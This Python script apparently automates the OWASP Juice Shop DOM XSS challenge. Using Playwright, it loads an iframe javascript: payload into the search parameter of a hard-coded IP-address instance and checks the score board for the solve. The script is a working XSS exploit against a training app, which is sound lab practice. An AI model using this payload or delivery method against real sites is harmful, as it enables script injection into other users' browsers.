#!/usr/bin/env python3
"""
Automated DOM XSS Challenge Solver using Playwright
This will actually execute the XSS in a real browser
"""

from playwright.sync_api import sync_playwright
import time

TARGET = "http://66.42.93.220:3000"

def solve_dom_xss_with_browser():
    """Use Playwright to solve the DOM XSS challenge in a real browser"""
    
    print("🎯 Starting Playwright-based DOM XSS solver...")
    
    with sync_playwright() as p:
        # Launch browser (headless mode for automation)
        browser = p.chromium.launch(headless=True)
        context = browser.new_context()
        page = context.new_page()
        
        print(f"📱 Opening Juice Shop at {TARGET}")
        page.goto(TARGET)
        page.wait_for_load_state("networkidle")
        
        # Accept cookies if present
        try:
            page.click("button:has-text('Accept')", timeout=2000)
        except:
            pass
        
        # Dismiss welcome banner if present
        try:
            page.click("[aria-label='Close Welcome Banner']", timeout=2000)
        except:
            pass
        
        print("🔍 Attempting DOM XSS via search...")
        
        # The DOM XSS payload
        xss_payload = '<iframe src="javascript:alert(`xss`)"></iframe>'
        
        # Navigate to the search page with XSS payload in URL
        vulnerable_url = f"{TARGET}/#/search?q={xss_payload}"
        print(f"📍 Navigating to: {vulnerable_url}")
        
        # Set up dialog handler to catch the alert
        dialog_triggered = False
        def handle_dialog(dialog):
            nonlocal dialog_triggered
            print(f"🎉 XSS Alert triggered! Message: {dialog.message}")
            dialog_triggered = True
            dialog.accept()
        
        page.on("dialog", handle_dialog)
        
        # Navigate to the vulnerable URL
        page.goto(vulnerable_url)
        
        # Wait a bit for the XSS to execute
        page.wait_for_timeout(3000)
        
        if dialog_triggered:
            print("✅ DOM XSS Successfully executed!")
        else:
            print("⏳ Trying alternative approach...")
            
            # Try using the search box directly
            try:
                # Click on search icon
                page.click("[aria-label='Search']", timeout=2000)
                
                # Enter the XSS payload in search field
                page.fill("input[type='search']", xss_payload)
                
                # Press Enter to search
                page.press("input[type='search']", "Enter")
                
                # Wait for potential XSS execution
                page.wait_for_timeout(2000)
            except:
                pass
        
        # Check if the challenge was marked as solved
        print("📊 Checking challenge status...")
        
        # Navigate to score board to check
        page.goto(f"{TARGET}/#/score-board")
        page.wait_for_load_state("networkidle")
        
        # Look for DOM XSS challenge status
        try:
            dom_xss_element = page.locator("text=/DOM XSS/i").first
            if dom_xss_element:
                # Check if it has a solved indicator
                parent = dom_xss_element.locator("..")
                if "solved" in parent.inner_text().lower() or "✓" in parent.inner_text():
                    print("🏆 DOM XSS Challenge marked as SOLVED!")
                else:
                    print("⚠️ Challenge found but not marked as solved yet")
        except:
            print("📋 Could not verify challenge status")
        
        # Take a screenshot for verification
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/dom_xss_result.png")
        print("📸 Screenshot saved to dom_xss_result.png")
        
        browser.close()
    
    print("\n✨ Browser automation completed!")
    return vulnerable_url

if __name__ == "__main__":
    print("=" * 60)
    print("OWASP Juice Shop v18 - DOM XSS Automated Browser Solver")
    print("=" * 60)
    
    try:
        url = solve_dom_xss_with_browser()
        print(f"\n🔗 Manual verification URL: {url}")
    except Exception as e:
        print(f"\n❌ Error during execution: {e}")
        print("\n💡 Alternative: Use the browser console script:")
        print("   1. Open http://66.42.93.220:3000 in your browser")
        print("   2. Open Developer Console (F12)")
        print("   3. Paste: window.location.href='#/search?q=<iframe src=\"javascript:alert(`xss`)\"></iframe>'")
    
    print("\n" + "=" * 60)
